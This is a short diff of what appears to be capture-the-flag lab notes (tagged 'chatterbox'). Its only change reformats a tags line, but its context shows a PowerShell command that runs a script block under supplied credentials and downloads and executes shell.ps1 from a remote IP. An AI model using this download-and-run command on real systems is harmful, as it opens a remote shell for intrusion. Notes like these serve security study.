@@ -18,4 +18,4 @@ $cred = new-object -typename System.Management.Automation.PSCredential -argument
 Invoke-Command -ScriptBlock { IEX(New-Object Net.WebClient).downloadString('http://10.10.15.48:8083/shell.ps1') } -Credential $cred -Computer localhost
 ```
 
-tags: powershell credentials ippsec chatterbox
+tags: #powershell #credentials #ippsec #chatterbox 
